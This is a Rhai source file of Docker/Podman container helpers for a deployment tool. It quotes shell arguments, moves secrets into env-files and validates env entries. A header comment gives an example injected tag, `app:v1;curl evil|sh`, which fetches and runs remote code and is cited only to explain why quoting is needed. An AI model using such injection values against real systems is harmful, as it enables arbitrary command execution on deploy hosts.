// docker.rhai — Container lifecycle helpers for Energize deployments.
//
// Provides build, push, pull, run, stop, remove, cleanup, and container
// inspection primitives. Works with Docker, Podman, OrbStack, or nerdctl
// via the runtime abstraction layer (lib/runtime.rhai).
//
// Usage:
//   import "lib/docker" as docker;
//   docker::docker_build(tag, #{context: ".", dockerfile: "Dockerfile"});
//   docker::docker_run(host, tag, name, #{ports: #{"80": "3000"}});
//
// CONTAINER-OVERLAY CONTRACT (dry-run fidelity): all container existence /
// state / health READS and container MUTATIONS go through the typed `sim_*`
// builtins, NEVER through a raw `docker inspect` / `nc -z` over ssh_exec — that
// would bypass the dry-run sim and diverge. So:
//   docker_container_running -> sim_container_running
//   docker_image_id          -> sim_image_id
//   docker_run               -> builds the cmd then sim_docker_run
//   docker_stop/rename/remove-> sim_docker_stop/rename/remove
// Raw ssh_exec is fine ONLY for effects that don't feed a later read
// (pull, prune, exec-into, logs).
//
// SHELL-SAFETY CONTRACT (issue #10): every caller-supplied value interpolated into a
// command is wrapped with sh_quote() before it reaches the shell. Image tags (from CI /
// branch names), container names, ports, env keys/values, volumes, networks, and build
// args all flow from user input, so an unquoted `app:v1;curl evil|sh` would otherwise run
// arbitrary commands on every host. The container runtime command (container_cmd(), e.g.
// "docker") and the fixed runtime flags are trusted constants and are NOT quoted.
//
// SECRET-OFF-ARGV CONTRACT (issue #11): container env vars are NEVER passed as `-e k=v`
// (which lands on the remote argv, visible via `ps`/`docker inspect`). docker_run writes
// them to a 0600 remote env-file via write_remote (stdin, off-argv) and passes --env-file.

import "lib/runtime" as rt;

// ---------------------------------------------------------------------------
// Build & Push (local)
// ---------------------------------------------------------------------------

// docker_build(tag, cfg) — build a container image locally.
//   cfg: #{context: ".", dockerfile: "Dockerfile", build_args: #{}, platform: ""}
//
// `platform` (e.g. "linux/amd64", "linux/arm64") targets a SINGLE architecture other than the
// build machine's own — the common case is building on an Apple Silicon laptop for an x86 VPS.
// A plain `docker build` bakes in the LOCAL architecture; without this, the mismatch doesn't
// surface until the container fails to start on the host with an opaque exec-format error,
// after build/push/pull have all already appeared to succeed. When set, this uses
// `buildx build --platform <value> --load` instead of a plain `build` — `--load` keeps the
// result as a normal local image so the existing separate `docker_push` step still works
// unchanged. A genuine multi-platform MANIFEST LIST (comma-separated platforms, pushed with
// `--push` at build time instead of a separate push step) is not supported by this cfg key.
// RUNTIME CAVEAT: `buildx` is a Docker/Podman concept — nerdctl (already "experimental" per
// lib/runtime.rhai) has no `buildx` subcommand, so `platform` combined with
// `rt::set_runtime("nerdctl")` will fail at the shell, not at plan time. Stick to docker/podman
// when using `platform`.
// Returns the ExecResult from the build command; throws on failure.
fn docker_build(tag, cfg) {
    let context = if cfg.contains("context") { cfg.context } else { "." };
    let dockerfile = if cfg.contains("dockerfile") { cfg.dockerfile } else { "Dockerfile" };
    let build_args = if cfg.contains("build_args") { cfg.build_args } else { #{} };
    let platform = if cfg.contains("platform") { cfg.platform } else { "" };

    let arg_parts = [];
    for k in build_args.keys() {
        // Quote the whole k=v token so a value with shell metacharacters stays literal.
        arg_parts.push("--build-arg " + sh_quote(k + "=" + build_args[k]));
    }
    let args = join(arg_parts, " ");

    let subcmd = if platform == "" {
        "build"
    } else {
        "buildx build --platform " + sh_quote(platform) + " --load"
    };
    let cmd = rt::container_cmd() + " " + subcmd + " -t " + sh_quote(tag) + " -f " + sh_quote(dockerfile) + " " + args + " " + sh_quote(context);
    let r = local_exec(cmd);
    if !r.ok {
        throw rt::container_cmd() + " build failed:\n" + r.stderr;
    }
    r
}

// docker_build(tag) — 0-cfg overload (defaults).
fn docker_build(tag) {
    docker_build(tag, #{})
}

// docker_push(tag) — push an image to the registry from the local machine.
fn docker_push(tag) {
    let r = local_exec(rt::container_cmd() + " push " + sh_quote(tag));
    if !r.ok {
        throw rt::container_cmd() + " push failed:\n" + r.stderr;
    }
    r
}

// ---------------------------------------------------------------------------
// Pull (remote)
// ---------------------------------------------------------------------------

// docker_pull(host, tag) — pull an image on a remote host.
fn docker_pull(host, tag) {
    let r = ssh_exec(host, rt::container_cmd() + " pull " + sh_quote(tag));
    if !r.ok {
        throw rt::container_cmd() + " pull on " + host + " failed:\n" + r.stderr;
    }
    r
}

// docker_pull_all(hosts, tag) — pull an image on all hosts in parallel.
// Returns the list of ExecResult; throws listing failed hosts.
fn docker_pull_all(hosts, tag) {
    let results = ssh_exec_all(hosts, rt::container_cmd() + " pull " + sh_quote(tag));
    let failed = results.filter(|r| !r.ok);
    if !failed.is_empty() {
        let names = failed.map(|r| r.host);
        throw rt::container_cmd() + " pull failed on: " + join(names, ", ");
    }
    results
}

// ---------------------------------------------------------------------------
// Run
// ---------------------------------------------------------------------------

// Robustness review R19: the env-file format is line-based (`KEY=VALUE`, one per line) — nothing
// enforced that a key or value couldn't itself contain the very characters that format depends
// on. A CI-sourced value containing a literal newline (a PEM-encoded key, say) silently injected
// EXTRA `KEY=VALUE` lines into the container's environment — effectively letting a value smuggle
// in arbitrary additional env vars the caller never intended. Called once per key before any
// env-file line is built, so the failure happens up front, not mid-write.
private fn validate_env_entry(k, v) {
    if k.contains("\n") || k.contains("\r") {
        throw "docker env var name " + k.to_debug() + " contains a newline, which would inject " +
              "extra lines into the env-file (robustness review R19).";
    }
    if k.contains("=") {
        throw "docker env var name " + k.to_debug() + " contains '=', which is not a valid " +
              "environment variable name (robustness review R19).";
    }
    if v.contains("\n") || v.contains("\r") {
        throw "docker env var " + k + "'s value contains a newline, which would inject extra " +
              "lines into the env-file (robustness review R19) — e.g. a PEM-encoded key can't " +
              "be passed as a single env value this way. Base64-encode it instead.";
    }
}

// docker_run(host, tag, name, cfg) — run a container on a remote host.
//   cfg: #{ports: #{host_port: container_port}, envs: #{}, volumes: #{},
//          network: "", extra: ""}
// Builds the `<cmd> run -d ...` string then routes it through sim_docker_run so
// the dry-run sim records the new container as running+healthy.
//
// Env vars are delivered via a 0600 remote env-file (off-argv, issue #11), NOT `-e k=v`.
// Every interpolated value is sh_quote()'d (issue #10). `extra` is the ONE escape hatch
// that is passed through verbatim (it's caller-authored raw flags), so keep secrets out of it.
// Throws if the env-file write itself fails (robustness review R30) — a silently-ignored
// failure there could let the container start against a stale env-file from a prior run.
// Returns the ExecResult (caller checks .ok).
fn docker_run(host, tag, name, cfg) {
    let ports = if cfg.contains("ports") { cfg.ports } else { #{} };
    let envs = if cfg.contains("envs") { cfg.envs } else { #{} };
    let volumes = if cfg.contains("volumes") { cfg.volumes } else { #{} };
    let network = if cfg.contains("network") { cfg.network } else { "" };
    let extra = if cfg.contains("extra") { cfg.extra } else { "" };

    let parts = [rt::container_cmd() + " run -d " + rt::runtime_run_flags()];
    parts.push("--name " + sh_quote(name));

    for hp in ports.keys() {
        parts.push("-p " + sh_quote(hp + ":" + ports[hp]));
    }

    // Env vars go to a 0600 remote env-file (stdin, off-argv) instead of `-e k=v` so they never
    // appear on the remote argv (`ps -ef`, `docker inspect`). Skip the file when there are none.
    if !envs.keys().is_empty() {
        let lines = [];
        for k in envs.keys() {
            // Each line is `KEY=VALUE`. Values are written literally to the file (no shell
            // involved) — docker reads them verbatim. validate_env_entry (robustness review R19)
            // refuses a key/value containing a newline or a key containing `=` up front, instead
            // of silently letting either corrupt the line-based format.
            validate_env_entry(k, envs[k]);
            lines.push(k + "=" + envs[k]);
        }
        // Checked (robustness review R30): this path is fixed per container NAME, not per run —
        // an accessory redeploy (accessory_run in deploy.rhai passes a stable, non-unique name)
        // reuses the same path every time. An unchecked write on a failed re-run would silently
        // leave `docker run --env-file` reading a STALE file from a prior successful run instead
        // of erroring, so the container would start looking healthy with old env vars/secrets.
        let env_path = "/tmp/.nrg-env-" + name;
        let wr = write_remote(host, join(lines, "\n") + "\n", env_path);
        if !wr.ok {
            throw "Failed to write env-file on " + host + " (" + env_path + "):\n" + wr.stderr;
        }
        parts.push("--env-file " + sh_quote(env_path));
    }

    for hp in volumes.keys() {
        parts.push("-v " + sh_quote(hp + ":" + volumes[hp]));
    }
    if network != "" {
        parts.push("--network " + sh_quote(network));
    }
    if extra != "" {
        parts.push(extra);
    }
    parts.push(sh_quote(tag));

    let cmd = join(parts, " ");
    sim_docker_run(host, tag, name, cmd)
}

// docker_run(host, tag, name) — 0-cfg overload.
fn docker_run(host, tag, name) {
    docker_run(host, tag, name, #{})
}

// docker_run_once(host, tag, command, cfg) — run `command` inside a THROWAWAY container built
// from image `tag` (`docker run --rm`), then return the ExecResult. This is the correct way to
// run release tasks (DB migrations, asset precompile) BEFORE a deploy: they must execute against
// the NEW image's code, never `exec` into the still-running OLD container (issue #8). Env vars
// are delivered via a 0600 remote env-file (off-argv, issue #11); every value is sh_quote()'d.
//   cfg: #{ envs: #{}, network: "" }
// Plain ssh_exec (NOT sim-routed): the container exits immediately, so it never feeds a later
// sim read; under dry-run it records + returns synthetic ok like any other command.
fn docker_run_once(host, tag, command, cfg) {
    let envs = if cfg.contains("envs") { cfg.envs } else { #{} };
    let network = if cfg.contains("network") { cfg.network } else { "" };

    let parts = [rt::container_cmd() + " run --rm"];
    if !envs.keys().is_empty() {
        let lines = [];
        for k in envs.keys() {
            // Same up-front validation as docker_run's env-file (robustness review R19).
            validate_env_entry(k, envs[k]);
            lines.push(k + "=" + envs[k]);
        }
        // Unique-ish path per (image command) run; the file is 0600 and short-lived. Checked
        // (robustness review R30): repeated releases of the same tag reuse this same path, so an
        // unchecked write on a failed re-run would silently reuse a stale env-file instead of
        // erroring, same risk as docker_run's env-file above.
        let env_path = "/tmp/.nrg-release-env-" + sh_quote_safe_name(tag);
        let wr = write_remote(host, join(lines, "\n") + "\n", env_path);
        if !wr.ok {
            throw "Failed to write env-file on " + host + " (" + env_path + "):\n" + wr.stderr;
        }
        parts.push("--env-file " + sh_quote(env_path));
    }
    if network != "" {
        parts.push("--network " + sh_quote(network));
    }
    parts.push(sh_quote(tag));
    // `command` is caller-authored (e.g. "bin/rails db:migrate"); passed through verbatim so the
    // entrypoint receives it as the container command. Keep secrets out of it (use envs).
    parts.push(command);

    ssh_exec(host, join(parts, " "))
}

// sh_quote_safe_name(s) — a filesystem-safe slug of `s` for building temp file names (the raw
// value still gets sh_quote()'d when it reaches the shell; this just avoids `/` and `:` in paths).
// Rhai string `replace` mutates in place, so work on a local copy.
private fn sh_quote_safe_name(s) {
    let t = "" + s;
    t.replace("/", "_");
    t.replace(":", "_");
    t
}

// ---------------------------------------------------------------------------
// Stop / Remove / Rename  (sim-routed mutations)
// ---------------------------------------------------------------------------

// docker_stop(host, name, cfg) — stop a running container.  cfg: #{timeout: 30}
fn docker_stop(host, name, cfg) {
    let timeout = if cfg.contains("timeout") { cfg.timeout } else { 30 };
    let cmd = rt::container_cmd() + " stop -t " + sh_quote("" + timeout) + " " + sh_quote(name) + " 2>/dev/null || true";
    sim_docker_stop(host, name, cmd)
}

// docker_stop(host, name) — 2-arg overload (timeout 30).
fn docker_stop(host, name) {
    docker_stop(host, name, #{})
}

// docker_remove(host, name) — remove a container.
fn docker_remove(host, name) {
    let cmd = rt::container_cmd() + " rm -f " + sh_quote(name) + " 2>/dev/null || true";
    sim_docker_remove(host, name, cmd)
}

// docker_rename(host, old_name, new_name) — rename a container.
fn docker_rename(host, old_name, new_name) {
    let cmd = rt::container_cmd() + " rename " + sh_quote(old_name) + " " + sh_quote(new_name) + " 2>/dev/null || true";
    sim_docker_rename(host, old_name, new_name, cmd)
}

// ---------------------------------------------------------------------------
// Inspection  (sim-routed reads)
// ---------------------------------------------------------------------------

// docker_container_running(host, name) -> bool — true if the container exists
// and is running. Routed through the sim so dry-run stays consistent.
fn docker_container_running(host, name) {
    sim_container_running(host, name)
}

// docker_image_id(host, tag) -> String — image id for a tag, or "" if not found.
fn docker_image_id(host, tag) {
    sim_image_id(host, tag)
}

// ---------------------------------------------------------------------------
// Cleanup
// ---------------------------------------------------------------------------

// docker_cleanup(host, cfg) — prune exited containers + DANGLING (untagged) images only.
//   cfg: reserved, currently unused.
// Returns the container-prune ExecResult if IT failed (an SSH-level failure — the connection
// dropped, say — the `|| true` only masks a docker-level failure, never that), otherwise the
// image-prune ExecResult (found reviewing R6b: the container-prune result used to be discarded
// unconditionally, so a caller checking `.ok` couldn't tell a dropped connection during the
// FIRST prune from a clean run if the second one happened to still succeed).
//
// This does NOT remove old TAGGED versions of the deployed repo (e.g. `myapp:v41`, `myapp:v40`,
// ...) — those accumulate on a host across every deploy. See `docker_prune_old_images` below
// (robustness review R22) for that, called separately from `deploy()` when `cfg.keep_images` is
// set.
fn docker_cleanup(host, cfg) {
    let _cmd = rt::container_cmd();
    let r1 = ssh_exec(host, _cmd + " container prune -f 2>/dev/null || true");
    let r2 = ssh_exec(host, _cmd + " image prune -f 2>/dev/null || true");
    if !r1.ok { r1 } else { r2 }
}

// docker_cleanup(host) — 1-arg overload.
fn docker_cleanup(host) {
    docker_cleanup(host, #{})
}

// docker_prune_old_images(host, repo, keep_n, protect_tags) -> #{ok, removed, stderr}
//
// Robustness review R22: `docker_cleanup`'s `image prune` only removes DANGLING (untagged)
// images — a repo's own old TAGGED versions (`myapp:v41`, `myapp:v40`, ...) are never touched,
// so they accumulate on every deploy host forever until the disk fills. This removes tagged
// images of `repo` on `host` beyond the `keep_n` most recently created, while NEVER removing any
// tag listed in `protect_tags` regardless of age — the caller (`deploy()`) always protects the
// version just deployed and the previous version rollback() might still need.
//
// Lists via `--format`, not `sim_image_id`/etc: this is a prune (an effect with no later read),
// the same "raw ssh_exec is fine" carve-out `docker_cleanup` already relies on (see this file's
// CONTAINER-OVERLAY CONTRACT note at the top) — dry-run fidelity doesn't apply to a fire-and-forget
// disk-hygiene pass.
//
// Never throws: an image still referenced by any container (even stopped) fails to remove by
// Docker/Podman's OWN safety net — `|| true` treats that as expected, not a bug to route around.
// A failure to even LIST images (SSH-level, or the runtime CLI itself erroring) is reported via
// `ok: false` rather than guessed at — better to skip a pruning round than act on incomplete data.
fn docker_prune_old_images(host, repo, keep_n, protect_tags) {
    let _cmd = rt::container_cmd();
    let r = ssh_exec(host, _cmd + " images " + sh_quote(repo) + " --format '{{.Tag}}|{{.CreatedAt}}'");
    if !r.ok {
        return #{ ok: false, removed: [], stderr: r.stderr };
    }

    // Sort key is "<CreatedAt>|<tag>": Docker/Podman's default `{{.CreatedAt}}` is a fixed-width,
    // zero-padded "YYYY-MM-DD HH:MM:SS ..." string, so lexicographic order already agrees with
    // chronological order — no date parsing needed. Plain string sort + reverse (ascending, then
    // newest-first) avoids relying on a custom comparator.
    let keys = [];
    for line in r.stdout.split("\n") {
        line.trim();
        if line == "" { continue; }
        let parts = line.split("|");
        if parts.len() < 2 { continue; }
        let tag = parts[0];
        if tag == "<none>" { continue; } // dangling; docker_cleanup's image prune handles these
        keys.push(parts[1] + "|" + tag);
    }
    keys.sort();
    keys.reverse(); // newest first

    let removed = [];
    let kept = 0;
    for key in keys {
        let tag = key.split("|")[1];
        if protect_tags.contains(tag) { continue; }
        if kept < keep_n {
            kept += 1;
            continue;
        }
        let full = repo + ":" + tag;
        ssh_exec(host, _cmd + " rmi " + sh_quote(full) + " 2>/dev/null || true");
        removed.push(full);
    }
    #{ ok: true, removed: removed, stderr: "" }
}

// ---------------------------------------------------------------------------
// Exec into container
// ---------------------------------------------------------------------------

// docker_exec(host, name, command) — run a command inside a running container.
// `command` is caller-authored raw (it IS a command line) and passed through verbatim; `name`
// is quoted. Keep secrets out of `command` (use ssh_exec_stdin / write_remote for those).
fn docker_exec(host, name, command) {
    ssh_exec(host, rt::container_cmd() + " exec " + sh_quote(name) + " " + command)
}

// ---------------------------------------------------------------------------
// Logs
// ---------------------------------------------------------------------------

// docker_logs(host, name, cfg) — recent logs from a container.  cfg: #{tail: 100}
fn docker_logs(host, name, cfg) {
    let tail = if cfg.contains("tail") { cfg.tail } else { 100 };
    ssh_exec(host, rt::container_cmd() + " logs --tail " + sh_quote("" + tail) + " " + sh_quote(name) + " 2>&1")
}

// docker_logs(host, name) — 2-arg overload (tail 100).
fn docker_logs(host, name) {
    docker_logs(host, name, #{})
}
